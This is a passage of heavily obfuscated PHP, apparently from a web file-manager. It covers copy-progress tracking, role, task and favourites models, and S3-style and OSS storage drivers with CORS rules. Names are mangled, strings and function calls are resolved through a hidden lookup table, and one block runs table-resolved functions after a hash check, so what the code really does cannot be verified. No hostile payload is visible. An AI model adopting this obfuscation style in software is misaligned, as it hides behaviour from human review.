!$b˜¤î³äÀô[$e„¯ÎÌÚ…–[744]]) { return; } if ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1640]] == $e„¯ÎÌÚ…–[1115]) { $d‡Ö¤ù‚š = $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1597]]; if ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1598]] != $e„¯ÎÌÚ…–[1115]) { $d‡Ö¤ù‚š = 0; } $d¬îÙëÌ§ = ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1601]] + $d‡Ö¤ù‚š) / $b˜¤î³äÀô[$e„¯ÎÌÚ…–[744]]; $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1551]] = $d¬îÙëÌ§ * 0.3; } else { if ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1640]] == $e„¯ÎÌÚ…–[311]) { $d¬îÙëÌ§ = $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1057]] / $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1043]]; $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1551]] = 0.3 + $d¬îÙëÌ§ * 0.5; } else { if ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1640]] == $e„¯ÎÌÚ…–[107]) { $d¬îÙëÌ§ = 0; if ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1596]]) { $d¬îÙëÌ§ = $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1597]] / $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1596]]; } $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1551]] = 0.3 + 0.5 + $d¬îÙëÌ§ * 0.2; } } } if ($b˜¤î³äÀô[$e„¯ÎÌÚ…–[1551]] > 0) { $Bò«òŞ™‚ = timeFloat() - $b˜¤î³äÀô[$e„¯ÎÌÚ…–[770]] - $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1554]]; $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1555]] = $Bò«òŞ™‚ * (1 - $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1551]]) / $b˜¤î³äÀô[$e„¯ÎÌÚ…–[1551]]; } } public function copyFileStart($D†àĞŞƒ, $F« é¤‹™, $cÅ›‹¯İ‰, $F©ªÏÚ½Ä’, $A£¦ø£‚©›, $eŒ‹›ô™ªå) { $d›Úê¦¯ç˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; parent::copyFileStart($D†àĞŞƒ, $F« é¤‹™, $cÅ›‹¯İ‰, $F©ªÏÚ½Ä’, $A£¦ø£‚©›, $eŒ‹›ô™ªå); $D¾ê³Œ°× =& $this->task; if ($D¾ê³Œ°×[$d›Úê¦¯ç˜[1640]] == $d›Úê¦¯ç˜[311]) { $D¾ê³Œ°×[$d›Úê¦¯ç˜[1640]] = $d›Úê¦¯ç˜[107]; } $this->update(); } public function copyFileEnd($cİéĞñå„‡, $C ïìšŠŸ, $f£ìÕÂŠ¦÷, $FÇŠ£ôä¸Õ, $cÔÒ­½ŞÕ, $a™²¶–ÙÕ) { $dùåÍ¿¯‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F¸¶Â×„«ß =& $this->task; $F¸¶Â×„«ß[$dùåÍ¿¯‘[1597]] = $F¸¶Â×„«ß[$dùåÍ¿¯‘[1596]]; $F¸¶Â×„«ß[$dùåÍ¿¯‘[1601]] += $F¸¶Â×„«ß[$dùåÍ¿¯‘[1596]]; $F¸¶Â×„«ß[$dùåÍ¿¯‘[1598]] = $dùåÍ¿¯‘[33]; $this->update(); } public function nameParse($f¢ÆŒñ±İ‹) { $d×âØ‹ìõ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¶êÂ¡ÇÎê =& $this->task; if ($a¶êÂ¡ÇÎê[$d×âØ‹ìõ[1057]] < $a¶êÂ¡ÇÎê[$d×âØ‹ìõ[1043]]) { $FŒ¯Åø¥Õ¶ = get_path_this($f¢ÆŒñ±İ‹); if (strstr($FŒ¯Åø¥Õ¶, $d×âØ‹ìõ[95])) { $a¶êÂ¡ÇÎê[$d×âØ‹ìõ[1057]] += 1; } } if ($a¶êÂ¡ÇÎê[$d×âØ‹ìõ[1640]] == $d×âØ‹ìõ[1115]) { $a¶êÂ¡ÇÎê[$d×âØ‹ìõ[1640]] = $d×âØ‹ìõ[311]; } $a¶êÂ¡ÇÎê[$d×âØ‹ìõ[1594]] = $f¢ÆŒñ±İ‹; $this->update(); } } goto aÁÉ¢„ÙÌÈ; B«½™‡÷À„: define($_SERVER[Ôğ—¤Šµˆ˜ñ£][237], 2); define($_SERVER[Ôğ—¤Šµˆ˜ñ£][238], 3); define($_SERVER[Ôğ—¤Šµˆ˜ñ£][239], 1); goto a„Ê×–—ß¥; e®îñ‘†àØ: $FèòÙñˆ§Œ = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][847]]; $A«çÔ…ŠÁÁ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][848]; if ($_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][849]] != $A«çÔ…ŠÁÁ($FèòÙñˆ§Œ)) { goto Fö±ªŸØŒ; CÚ¥œµ¢çö: $f™á‘³¤¿µ = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][229], $D¢¯˜”ˆ“¾); if (count($f™á‘³¤¿µ) < $_SERVER[Ôğ—¤Šµˆ˜ñ£][609]) { $c—Á‘ö‰‘Ç = $_SERVER[Ôğ—¤Šµˆ˜ñ£][853]; $c—Á‘ö‰‘Ç(); } $E™„‡ğ´É = $_SERVER[Ôğ—¤Šµˆ˜ñ£][854]; goto aŸ²Ä£¨¤; aŸ²Ä£¨¤: $E™„‡ğ´É($FèòÙñˆ§Œ); goto AÔ–óÄ„â; Fö±ªŸØŒ: $B‡÷äŠÂœ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][850]; $eóÚ•é¾´Ù = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][851]] . $_SERVER[Ôğ—¤Šµˆ˜ñ£][852]; $D¢¯˜”ˆ“¾ = $B‡÷äŠÂœ($eóÚ•é¾´Ù); goto CÚ¥œµ¢çö; AÔ–óÄ„â: } goto cš£Ä‰ù©Ş; DØØó·é Ú: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\162\157\154\145\114\151\163\x74"; public $field = array("\156\141\155\x65", "\141\x75\164\150", "\154\x61\x62\x65\x6c", "\144\x69\163\x70\x6c\141\x79", "\x73\171\x73\x74\145\x6d", "\144\x65\163\143", "\151\x67\156\x6f\x72\145\x45\170\x74", "\151\x67\x6e\157\x72\145\x46\x69\x6c\145\123\x69\172\x65", "\x61\x64\155\151\156\x69\163\x74\x72\x61\x74\157\162", "\163\x6f\x72\164"); public function listData($c‚¹æ†ëöĞ = false, $aî–‚Ö·º = "\x73\x6f\162\164", $Eœá½È—®— = false) { $b³‡©Ÿ„“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¾ÒÍŒè– = parent::listData($c‚¹æ†ëöĞ, $aî–‚Ö·º, $Eœá½È—®—); if (!$c‚¹æ†ëöĞ) { foreach ($c¾ÒÍŒè– as $AÉˆë¨‘ğİ => $C©ÇÂÎÃ‡Š) { if ($C©ÇÂÎÃ‡Š[$b³‡©Ÿ„“[1911]] == 1) { $c¾ÒÍŒè–[$AÉˆë¨‘ğİ][$b³‡©Ÿ„“[445]] = LNG($b³‡©Ÿ„“[2135]); } } } return $c¾ÒÍŒè–; } public function update($FòÉåÅÃï, $dôÒ¶˜ø˜Î) { goto AÌ ÓŸßğˆ; e•í¿ƒ¸Â®: if (!$D£í÷®Ã£º || $a äŞ¬¹¹– && $a äŞ¬¹¹–[$b´ö¤¶®Šç[395]] != $D£í÷®Ã£º[$b´ö¤¶®Šç[395]]) { return !1; } if ($a äŞ¬¹¹–[$b´ö¤¶®Šç[1911]] == 1) { $dôÒ¶˜ø˜Î = array($b´ö¤¶®Šç[28] => $dôÒ¶˜ø˜Î[$b´ö¤¶®Šç[28]], $b´ö¤¶®Šç[1741] => $dôÒ¶˜ø˜Î[$b´ö¤¶®Šç[1741]]); } $this->filterAuth($dôÒ¶˜ø˜Î[$b´ö¤¶®Šç[408]]); goto aİµ¾Ìîğ; AÌ ÓŸßğˆ: $b´ö¤¶®Šç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D£í÷®Ã£º = parent::listData($FòÉåÅÃï); $a äŞ¬¹¹– = $this->findByName($dôÒ¶˜ø˜Î[$b´ö¤¶®Šç[28]]); goto e•í¿ƒ¸Â®; aİµ¾Ìîğ: return parent::update($FòÉåÅÃï, $dôÒ¶˜ø˜Î); goto cÇŠèƒ˜Æ; cÇŠèƒ˜Æ: } public function remove($C¨äÓÒàá) { $Eåœƒ”“ã = parent::listData($C¨äÓÒàá); if (!$Eåœƒ”“ã || $Eåœƒ”“ã[$_SERVER[Ôğ—¤Šµˆ˜ñ£][1192]]) { return !1; } return parent::remove($C¨äÓÒàá); } public function add($eœà­œÏ¢‹) { goto aˆÖØ´ßŠß; D¡õÇ×Ø¿Ç: $AÚ›ğ¾Öò© = array($CğÅš¾‘•Ø[415] => $Dïøˆ¬Œá£, $CğÅš¾‘•Ø[1725] => $CğÅš¾‘•Ø[33], $CğÅš¾‘•Ø[1721] => $CğÅš¾‘•Ø[1729], $CğÅš¾‘•Ø[2136] => 1, $CğÅš¾‘•Ø[1724] => 0, $CğÅš¾‘•Ø[2137] => 0, $CğÅš¾‘•Ø[1723] => $this->getSort()); $eœà­œÏ¢‹ = array_merge($AÚ›ğ¾Öò©, $eœà­œÏ¢‹); $this->filterAuth($eœà­œÏ¢‹[$CğÅš¾‘•Ø[408]]); goto B÷ÆŒä—ˆÍ; B÷ÆŒä—ˆÍ: return parent::insert($eœà­œÏ¢‹); goto d’Æ„ÔÕ’; aˆÖØ´ßŠß: $CğÅš¾‘•Ø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dïøˆ¬Œá£ = $eœà­œÏ¢‹[$CğÅš¾‘•Ø[28]]; if ($this->findByName($Dïøˆ¬Œá£)) { return !1; } goto D¡õÇ×Ø¿Ç; d’Æ„ÔÕ’: } private function getSort() { $C·„ÂÀ£Óæ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F°ñ½‰«“ = parent::listData(); $cŒÔ—åŒƒ± = array_to_keyvalue($F°ñ½‰«“, $C·„ÂÀ£Óæ[33], $C·„ÂÀ£Óæ[1742]); return empty($cŒÔ—åŒƒ±) ? 0 : max($cŒÔ—åŒƒ±) + 1; } private function filterAuth(&$b§ÇÈøÃ·È) { $dÆ¹§«õ‚Ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÌ£’ÎË „ = array(); $FÒ‚ÉÅÍàŠ = array_filter(explode($dÆ¹§«õ‚Ì[47], $b§ÇÈøÃ·È)); foreach ($FÒ‚ÉÅÍàŠ as $b§ÇÈøÃ·È) { $f„êÊ¯µ»Š = explode($dÆ¹§«õ‚Ì[95], $b§ÇÈøÃ·È); if ($f„êÊ¯µ»Š[0] == $dÆ¹§«õ‚Ì[2138] && $f„êÊ¯µ»Š[1] != $dÆ¹§«õ‚Ì[1111]) { $d¢ãøÄì÷ = $f„êÊ¯µ»Š[0] . $dÆ¹§«õ‚Ì[95] . $f„êÊ¯µ»Š[1] . $dÆ¹§«õ‚Ì[2139]; if (!in_array($d¢ãøÄì÷, $FÒ‚ÉÅÍàŠ)) { $dÌ£’ÎË „[] = $d¢ãøÄì÷; } } $dÌ£’ÎË „[] = $b§ÇÈøÃ·È; } $b§ÇÈøÃ·È = implode($dÆ¹§«õ‚Ì[47], $dÌ£’ÎË „); } public function sort($D„½ÄÓâË‹, $bƒ«Ò±¦È‹) { return parent::update($D„½ÄÓâË‹, $bƒ«Ò±¦È‹); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\164\141\163\153\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\164\171\160\x65", "\145\166\x65\x6e\x74", "\164\x69\x6d\x65", "\x64\x65\163\x63", "\163\171\x73\164\x65\x6d", "\145\156\141\x62\154\145", "\154\x61\x73\164\122\x75\x6e", "\163\x6f\162\x74"); public function listData($DìòñĞ ¦› = false, $B‰íÙš®±ï = "\163\x6f\162\164", $F²äóİÍ‹· = false) { return parent::listData($DìòñĞ ¦›, $B‰íÙš®±ï, $F²äóİÍ‹·); } public function add($AÇ² ‰ˆŸ) { $eÍ¾İÅÜÕ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÃ´èİ¹Ç = $this->findByName($AÇ² ‰ˆŸ[$eÍ¾İÅÜÕ¡[28]]); if ($cÃ´èİ¹Ç) { return !1; } $AÇ² ‰ˆŸ[$eÍ¾İÅÜÕ¡[1514]] = 0; $AÇ² ‰ˆŸ[$eÍ¾İÅÜÕ¡[1742]] = $this->getSort(); return parent::insert($AÇ² ‰ˆŸ); } private function getSort() { $B•¿–â£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aäÚïª¿š° = parent::listData(); $B…‘¥Ş = array_to_keyvalue($aäÚïª¿š°, $B•¿–â£[33], $B•¿–â£[1742]); return empty($B…‘¥Ş) ? 0 : max($B…‘¥Ş) + 1; } public function update($b‡…îˆÚ, $Aã½‚·Ÿ˜á) { $f—Á›ÎÁŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f„Õ©øß‰´ = $this->listData($b‡…îˆÚ); $B¦Õ–¤·ˆ = $this->findByName($Aã½‚·Ÿ˜á[$f—Á›ÎÁŒ[28]]); if (!$f„Õ©øß‰´ || $B¦Õ–¤·ˆ && $B¦Õ–¤·ˆ[$f—Á›ÎÁŒ[395]] != $f„Õ©øß‰´[$f—Á›ÎÁŒ[395]]) { return !1; } return parent::update($b‡…îˆÚ, $Aã½‚·Ÿ˜á); } public function remove($D°¾èÕ”º, $dÃŒ×¢ÅÈ = false) { $A…˜Ì”¥Î‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e„‡­’á»» = $this->listData($D°¾èÕ”º); if (!$e„‡­’á»») { return; } if (!$dÃŒ×¢ÅÈ && $e„‡­’á»»[$A…˜Ì”¥Î‡[1192]] == $A…˜Ì”¥Î‡[87]) { return !1; } return parent::remove($D°¾èÕ”º); } public function enable($CøŸªÚ‹åĞ, $CƒŞÕ×¬Ş¿) { return $this->update($CøŸªÚ‹åĞ, array($_SERVER[Ôğ—¤Šµˆ˜ñ£][2130] => $CƒŞÕ×¬Ş¿)); } public function run($c›ò™‚­íÑ) { return $this->update($c›ò™‚­íÑ, array($_SERVER[Ôğ—¤Šµˆ˜ñ£][2140] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($B…×¼‡ê‰·) { $d“……ÙÑŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($d“……ÙÑŠ[1826] => array(USER_ID, $d“……ÙÑŠ[2141])); } protected function listData() { $e¸¬¨¯±İÕ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $féŒ¹é×…Ê = array($e¸¬¨¯±İÕ[1541] => USER_ID, $e¸¬¨¯±İÕ[477] => 0); $c–ê³ğÇß = $e¸¬¨¯±İÕ[2142]; $b·®äİ›‰µ = $this->field($c–ê³ğÇß)->where($féŒ¹é×…Ê)->order($e¸¬¨¯±İÕ[2143])->select(); return $b·®äİ›‰µ ? $b·®äİ›‰µ : array(); } protected function resetCache() { } protected function listView() { goto dÓ¬øÄóÄ; b×®œ¼èÎ: $dù±ĞÏÇŒº = array_to_keyvalue($dù±ĞÏÇŒº, $eÙä¿ŒÍ’·[397]); foreach ($CÏ’ˆøİ¯› as $eÆ¤õÊ¤ => $cà¤©†ƒİ©) { $DÛ·…Ê ƒÉ = $dù±ĞÏÇŒº[$cà¤©†ƒİ©[$eÙä¿ŒÍ’·[76]]]; $DÛ·…Ê ƒÉ = $DÛ·…Ê ƒÉ ? $DÛ·…Ê ƒÉ : array(); $CÏ’ˆøİ¯›[$eÆ¤õÊ¤] = array_merge($DÛ·…Ê ƒÉ, $cà¤©†ƒİ©); } return $CÏ’ˆøİ¯›; goto fââµ¤ƒƒÉ; cŸíŞ‡ˆ¡: $DÔÂŒÜÁÓª = array($eÙä¿ŒÍ’·[412] => array($eÙä¿ŒÍ’·[413], $b°¼ªÈôï©)); $dù±ĞÏÇŒº = Model($eÙä¿ŒÍ’·[813])->listSource($DÔÂŒÜÁÓª, $b…ñğ™ç¿›); $dù±ĞÏÇŒº = array_merge($dù±ĞÏÇŒº[$eÙä¿ŒÍ’·[74]], $dù±ĞÏÇŒº[$eÙä¿ŒÍ’·[75]]); goto b×®œ¼èÎ; CÓ¢òÄªíŞ: $b°¼ªÈôï© = array_to_keyvalue($aŒÒ´†Èõ¤, $eÙä¿ŒÍ’·[33], $eÙä¿ŒÍ’·[76]); if (!$b°¼ªÈôï©) { return $CÏ’ˆøİ¯›; } $b…ñğ™ç¿› = 2000; goto cŸíŞ‡ˆ¡; dÓ¬øÄóÄ: $eÙä¿ŒÍ’· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÏ’ˆøİ¯› = $this->listData(); $aŒÒ´†Èõ¤ = array_filter_by_field($CÏ’ˆøİ¯›, $eÙä¿ŒÍ’·[29], $eÙä¿ŒÍ’·[411]); goto CÓ¢òÄªíŞ; fââµ¤ƒƒÉ: } protected function addFav($FßÇŠ††…Â, $C˜¦æ»·ù„ = '', $dÑáŠôä´ë = "\x73\157\165\162\x63\x65") { goto FæŠîÚâŒ¼; F‹ÜÜÒÇ…•: return $this->add($FŒİèìÛÍª); goto BàË‡Ä¨Ìô; FæŠîÚâŒ¼: $eç¡ö†·Âî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b²«—â  = array($eç¡ö†·Âî[1541] => USER_ID, $eç¡ö†·Âî[477] => 0, $eç¡ö†·Âî[417] => $dÑáŠôä´ë, $eç¡ö†·Âî[416] => $FßÇŠ††…Â); if ($this->where($b²«—â )->find()) { return !1; } goto f§à‚È½ë«; f§à‚È½ë«: $b²«—â  = array($eç¡ö†·Âî[1541] => USER_ID, $eç¡ö†·Âî[477] => 0); $c‹¥÷÷Ô‹õ = $this->where($b²«—â )->max($eç¡ö†·Âî[1742]); if (!$c‹¥÷÷Ô‹õ) { $c‹¥÷÷Ô‹õ = 0; } goto DƒÆÅí¿×ª; DƒÆÅí¿×ª: if (!$C˜¦æ»·ù„ && $dÑáŠôä´ë == $eç¡ö†·Âî[411]) { $A÷Ñ¿É¥Å = Model($eç¡ö†·Âî[1227])->where(array($eç¡ö†·Âî[412] => $FßÇŠ††…Â))->find(); if (!$A÷Ñ¿É¥Å) { return !1; } $C˜¦æ»·ù„ = $A÷Ñ¿É¥Å[$eç¡ö†·Âî[28]]; } $C˜¦æ»·ù„ = $this->getAutoName($C˜¦æ»·ù„); $FŒİèìÛÍª = array($eç¡ö†·Âî[1541] => USER_ID, $eç¡ö†·Âî[477] => 0, $eç¡ö†·Âî[415] => $C˜¦æ»·ù„, $eç¡ö†·Âî[416] => $FßÇŠ††…Â, $eç¡ö†·Âî[417] => $dÑáŠôä´ë, $eç¡ö†·Âî[1723] => $c‹¥÷÷Ô‹õ + 1); goto F‹ÜÜÒÇ…•; BàË‡Ä¨Ìô: } protected function remove($E¹Œù¼Ğ¹) { $a‰ÊáìŒ• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dë°šíĞ²ê = array($a‰ÊáìŒ•[1541] => USER_ID, $a‰ÊáìŒ•[414] => $E¹Œù¼Ğ¹); return $this->where($dë°šíĞ²ê)->delete(); } protected function removeByName($Dá­‚êåÌ) { $a¦ƒô‘¯Á¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aªˆÅÎé¦ = array($a¦ƒô‘¯Á¨[1541] => USER_ID, $a¦ƒô‘¯Á¨[415] => $Dá­‚êåÌ, $a¦ƒô‘¯Á¨[477] => 0); return $this->where($aªˆÅÎé¦)->delete(); } protected function rename($b¼¤¨×Í†, $CìŠ‹¯µŠ‚) { $fÜĞÎÊˆ¶¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($b¼¤¨×Í† == $CìŠ‹¯µŠ‚) { return !1; } $ağ©çß‹ = $this->getAutoName($CìŠ‹¯µŠ‚); if ($CìŠ‹¯µŠ‚ != $ağ©çß‹) { return !1; } $B·óÅ£²×Ò = array($fÜĞÎÊˆ¶¯[1541] => USER_ID, $fÜĞÎÊˆ¶¯[477] => 0, $fÜĞÎÊˆ¶¯[28] => $b¼¤¨×Í†); return $this->where($B·óÅ£²×Ò)->save(array($fÜĞÎÊˆ¶¯[28] => $CìŠ‹¯µŠ‚)); } protected function resetSort($AÏˆŸ¬‰Ô¦) { $E§‚œ©® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÏˆŸ¬‰Ô¦ = is_array($AÏˆŸ¬‰Ô¦) ? $AÏˆŸ¬‰Ô¦ : array(); $b³äÓÌ¡‡ = array($E§‚œ©®[1541] => USER_ID); for ($F¶Àª½Ü = 0; $F¶Àª½Ü < count($AÏˆŸ¬‰Ô¦); $F¶Àª½Ü++) { $b³äÓÌ¡‡[$E§‚œ©®[414]] = $AÏˆŸ¬‰Ô¦[$F¶Àª½Ü]; $this->where($b³äÓÌ¡‡)->save(array($E§‚œ©®[1723] => $F¶Àª½Ü + 1)); } return !0; } protected function moveTop($c÷ÌÁÌ±¦‹) { goto c•³– ®ò; c•³– ®ò: $E¾¢Ò„ø© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D‘ÍçÇç£ = array($E¾¢Ò„ø©[1541] => USER_ID, $E¾¢Ò„ø©[477] => 0); $C„Ò‰›â = $this->where($D‘ÍçÇç£)->where(array($E¾¢Ò„ø©[28] => $c÷ÌÁÌ±¦‹))->find(); goto C¢»—÷¾Ë¼; FºÚÚ¢’Ôğ: return $this->resetSort($E ÆÙÉ¡ÂÒ); goto BÁ¦ìÙĞ¬; C¢»—÷¾Ë¼: if (!$C„Ò‰›â) { return; } $E ÆÙÉ¡ÂÒ = $this->field($E¾¢Ò„ø©[395])->where($D‘ÍçÇç£)->order($E¾¢Ò„ø©[2143])->select(); $E ÆÙÉ¡ÂÒ = array_to_keyvalue($E ÆÙÉ¡ÂÒ, $E¾¢Ò„ø©[33], $E¾¢Ò„ø©[395]); goto døÂÇè‡¦Ñ; døÂÇè‡¦Ñ: $AÈÕ¬¦•É­ = $E ÆÙÉ¡ÂÒ; $E ÆÙÉ¡ÂÒ = array_remove_value($E ÆÙÉ¡ÂÒ, $C„Ò‰›â[$E¾¢Ò„ø©[395]]); array_unshift($E ÆÙÉ¡ÂÒ, $C„Ò‰›â[$E¾¢Ò„ø©[395]]); goto FºÚÚ¢’Ôğ; BÁ¦ìÙĞ¬: } protected function moveBottom($DÀÚÎ¨½‘) { $dÛÂ¥­ëçó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eø÷²¤¶½µ = array($dÛÂ¥­ëçó[1541] => USER_ID, $dÛÂ¥­ëçó[477] => 0); $B‹èæò¸ª = $this->where($eø÷²¤¶½µ)->max($dÛÂ¥­ëçó[1742]); $F»ğãßÜÈ† = array($dÛÂ¥­ëçó[1742] => $B‹èæò¸ª + 1); return $this->where($eø÷²¤¶½µ)->where(array($dÛÂ¥­ëçó[28] => $DÀÚÎ¨½‘))->save($F»ğãßÜÈ†); } private function getAutoName($cÊã‚˜¼Çì) { goto CÅ‘Ùøç÷Ü; Dî¯»¨ù¡¥: $c¼ â­ç‰ˆ = array_to_keyvalue($c¼ â­ç‰ˆ, $aù“’¤õÄ¥[33], $aù“’¤õÄ¥[28]); if (!$c¼ â­ç‰ˆ || !in_array($cÊã‚˜¼Çì, $c¼ â­ç‰ˆ)) { return $cÊã‚˜¼Çì; } for ($dùá¥©ˆ»ë = 0; $dùá¥©ˆ»ë < count($c¼ â­ç‰ˆ); $dùá¥©ˆ»ë++) { if (!in_array($cÊã‚˜¼Çì . "\x28{$dùá¥©ˆ»ë}\x29", $c¼ â­ç‰ˆ)) { return $cÊã‚˜¼Çì . "\x28{$dùá¥©ˆ»ë}\51"; } } goto D©ÚÜöÈ±ˆ; D©ÚÜöÈ±ˆ: return $cÊã‚˜¼Çì . "\50{$dùá¥©ˆ»ë}\x29"; goto fƒ½ó‰Œ; CÅ‘Ùøç÷Ü: $aù“’¤õÄ¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fæØŒ…¾ÖÌ = array($aù“’¤õÄ¥[1541] => USER_ID, $aù“’¤õÄ¥[477] => 0); $c¼ â­ç‰ˆ = $this->field($aù“’¤õÄ¥[28])->where($fæØŒ…¾ÖÌ)->select(); goto Dî¯»¨ù¡¥; fƒ½ó‰Œ: } } goto a£¸ê•âĞ”; aå–î†¸›Û: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c‡Â–”…§é) { parent::__construct($c‡Â–”…§é); $this->signatureVersion($_SERVER[Ôğ—¤Šµˆ˜ñ£][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D‚Ì¥‹Õ™) { parent::__construct($D‚Ì¥‹Õ™); $this->signatureVersion($_SERVER[Ôğ—¤Šµˆ˜ñ£][212]); } public function fileOutLink($BÏ¬¹µõ‡Ì) { $Fˆ™²Ö¹è¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (substr($BÏ¬¹µõ‡Ì, 0, 7) == $Fˆ™²Ö¹è¤[1225]) { $BÏ¬¹µõ‡Ì = $Fˆ™²Ö¹è¤[1226] . substr($BÏ¬¹µõ‡Ì, 7); } header($Fˆ™²Ö¹è¤[159] . $BÏ¬¹µõ‡Ì); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($b†àÙ‚Ôæİ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1281]; $this->_init($b†àÙ‚Ôæİ); } public function _init($eê²ÆÊÍŠ) { $f™£¡¯•Á™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($eê²ÆÊÍŠ as $AÙŠÑ‹ÒèÂ => $Bá¨Ûæô) { if (isset($this->{$AÙŠÑ‹ÒèÂ})) { $this->{$AÙŠÑ‹ÒèÂ} = $Bá¨Ûæô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($f™£¡¯•Á™[1282] . LNG($f™£¡¯•Á™[1283])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto d¨ÖŒÅï›õ; e‰æº¥Ñ‘Ş: $eàáÒ‘…Ë²->addAllowedMethod($F×ó¶Œ‘Ğ¢[1287]); $eàáÒ‘…Ë²->addAllowedMethod($F×ó¶Œ‘Ğ¢[1288]); $eàáÒ‘…Ë²->addAllowedMethod($F×ó¶Œ‘Ğ¢[158]); goto cëá¯ùìŸ; d¿š›‘Á´¥: $eàáÒ‘…Ë²->addAllowedOrigin($F×ó¶Œ‘Ğ¢[1284]); $eàáÒ‘…Ë²->addAllowedMethod($F×ó¶Œ‘Ğ¢[1285]); $eàáÒ‘…Ë²->addAllowedMethod($F×ó¶Œ‘Ğ¢[1286]); goto e‰æº¥Ñ‘Ş; cëá¯ùìŸ: $eàáÒ‘…Ë²->setMaxAgeSeconds(600); $eàáÒ‘…Ë²->addExposeHeader($F×ó¶Œ‘Ğ¢[1289]); $eàáÒ‘…Ë²->addAllowedHeader($F×ó¶Œ‘Ğ¢[1284]); goto eÎÛ¢«¡•‚; eÎÛ¢«¡•‚: $CÌğƒµ÷ºÌ->addRule($eàáÒ‘…Ë²); try { $this->client->putBucketCors($this->bucket, $CÌğƒµ÷ºÌ); } catch (OSS\Core\OssException $E‘®Ñ”÷ÍÅ) { return !1; } return !0; goto eª´ççÍµæ; d¨ÖŒÅï›õ: $F×ó¶Œ‘Ğ¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÌğƒµ÷ºÌ = new OSS\Model\CorsConfig(); $eàáÒ‘…Ë² = new OSS\Model\CorsRule(); goto d¿š›‘Á´¥; eª´ççÍµæ: } public function getBucketCors() { goto a™îš¬ˆ¸ó; a™îš¬ˆ¸ó: $E’‚èŒìš¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÈ‘«œ¤÷ = null; try { $FÈ‘«œ¤÷ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $b¸™©“Üå†) { return null; } goto a¶½Ğƒ„Úè; cŸšáÉƒ‘®: $Dáíñ±„ƒ = $Bæ‡Ûª½¼˜[0]->getMaxAgeSeconds(); $a…œŞ¢’‡Ï = $Bæ‡Ûª½¼˜[0]->getExposeHeaders(); $d¼õŒá“‚¨ = $Bæ‡Ûª½¼˜[0]->getAllowedHeaders(); goto FñÖÃ­ª¯Ñ; FñÖÃ­ª¯Ñ: return array($E’‚èŒìš¾[181] => isset($f„Á¤´å[0]) ? $f„Á¤´å[0] : $E’‚èŒìš¾[33], $E’‚èŒìš¾[185] => $eÅÎÃé’Ğ, $E’‚èŒìš¾[1290] => $Dáíñ±„ƒ, $E’‚èŒìš¾[1291] => isset($a…œŞ¢’‡Ï[0]) ? $a…œŞ¢’‡Ï[0] : 